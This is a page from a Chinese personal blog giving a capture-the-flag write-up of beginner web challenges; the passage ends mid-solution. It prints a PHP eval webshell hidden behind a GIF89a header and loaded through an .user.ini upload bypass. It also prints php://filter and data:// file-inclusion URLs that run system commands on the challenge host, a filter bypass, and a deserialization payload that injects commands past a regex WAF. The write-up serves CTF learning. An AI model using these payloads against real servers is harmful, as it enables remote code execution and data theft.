@@ -1,0 +1,860 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Demo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="easyupload后门上传以及绕过1234检查文件内容是否有php字符串检查后缀中是否有htaccess或ph检查文件头部信息检查文件类型  1234利用短标签&lt;?&#x3D;利用.user.ini文件构成的PHP后门在文件头部添加一个图片的文件头，比如GIF89a修改上传时的Content-Type   12GIF89a                  auto_prepend_file&#x3D;a.j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界-web入门">
+<meta property="og:url" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="Demo_博客">
+<meta property="og:description" content="easyupload后门上传以及绕过1234检查文件内容是否有php字符串检查后缀中是否有htaccess或ph检查文件头部信息检查文件类型  1234利用短标签&lt;?&#x3D;利用.user.ini文件构成的PHP后门在文件头部添加一个图片的文件头，比如GIF89a修改上传时的Content-Type   12GIF89a                  auto_prepend_file&#x3D;a.j">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210739643.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210903075.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312211054336.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312214026007.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312220030319.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313090927169.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313091104914.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313091603555.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313091747429.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313111017306.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313193542911.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205338816.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205643826.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205041049.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313213352601.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313214019196.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314084124938.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314105502526.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314104447257.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314143813560.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314144938645.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230314200139093.png">
+<meta property="article:published_time" content="2023-03-15T06:44:44.000Z">
+<meta property="article:modified_time" content="2023-03-15T06:46:40.338Z">
+<meta property="article:author" content="Demo">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://wangchenchina.github.io/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210739643.png">
+  
+  
+  
+  <title>攻防世界-web入门 - Demo_博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wangchenchina.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Demo_博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/bbs/">
+                <i class="iconfont icon-notebook"></i>
+                留言板
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="攻防世界-web入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-15 14:44" pubdate>
+          2023年3月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          85 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界-web入门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h3><h4 id="后门上传以及绕过"><a href="#后门上传以及绕过" class="headerlink" title="后门上传以及绕过"></a>后门上传以及绕过</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">检查文件内容是否有php字符串<br>检查后缀中是否有htaccess或ph<br>检查文件头部信息<br>检查文件类型<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用短标签&lt;?=<br>利用.<span class="hljs-keyword">user</span>.ini文件构成的PHP后门<br>在文件头部添加一个图片的文件头，比如GIF89a<br>修改上传时的Content-<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210739643.png" srcset="/img/loading.gif" lazyload alt="image-20230312210739643"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a                  <br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312210903075.png" srcset="/img/loading.gif" lazyload alt="image-20230312210903075"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312211054336.png" srcset="/img/loading.gif" lazyload alt="image-20230312211054336"></p>
+<h3 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h3><h4 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><p>网页源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get(&#x27;display_errors&#x27;) ) &#123;<br>  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);<br>  &#125;<br>error_reporting(E_ALL);<br>$lan = $_COOKIE[&#x27;language&#x27;];    //取cookie language<br>if(!$lan)<br>&#123;<br>	@setcookie(&quot;language&quot;,&quot;english&quot;);<br>	@include(&quot;english.php&quot;);<br>&#125;<br>else<br>&#123;<br>	@include($lan.&quot;.php&quot;);        //拼接.php<br>&#125;<br>$x=file_get_contents(&#x27;index.php&#x27;);<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>构造Cookie：language&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag</p>
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312214026007.png" srcset="/img/loading.gif" lazyload alt="image-20230312214026007"></p>
+<p>返回base64解码得到flag</p>
+<h3 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h3><h4 id="PHP文件包含利用-1"><a href="#PHP文件包含利用-1" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230312220030319.png" srcset="/img/loading.gif" lazyload alt="image-20230312220030319"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">54651</span><span class="hljs-regexp">/?file1=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode<span class="hljs-regexp">/resource=flag.php&amp;file2=data:/</span><span class="hljs-regexp">/text/</span>plain,hello ctf<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">54651</span>/?file1=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php&amp;file2=php:<span class="hljs-regexp">//inpu</span>t<br>POST 传输的数据是：hello ctf<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><h4 id="PHP文件包含利用-2"><a href="#PHP文件包含利用-2" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://61.147.171.105:52879/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php&quot;</span>)<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h3><h4 id="PHP文件包含利用-3"><a href="#PHP文件包含利用-3" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>代码很简单，构造</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51485</span><span class="hljs-regexp">/?filename=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>失败显示<strong>do not hack!</strong></p>
+<p>利用convert.* 过滤器，构造</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51485</span><span class="hljs-regexp">/?filename=php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.UTF-<span class="hljs-number">7</span>.UCS-<span class="hljs-number">4</span>LE*/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="unseping"><a href="#unseping" class="headerlink" title="unseping"></a>unseping</h3><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        &#125;<br>    &#125; <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        &#125;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>根据代码构造ease类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125; <br>&#125;<br><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313090927169.png" srcset="/img/loading.gif" lazyload alt="image-20230313090927169"></p>
+<img src="image-20230313091104914.png" srcset="/img/loading.gif" lazyload alt="image-20230313091104914" style="zoom:50%;" />
+
+<p>构造 ls flag_1s_here </p>
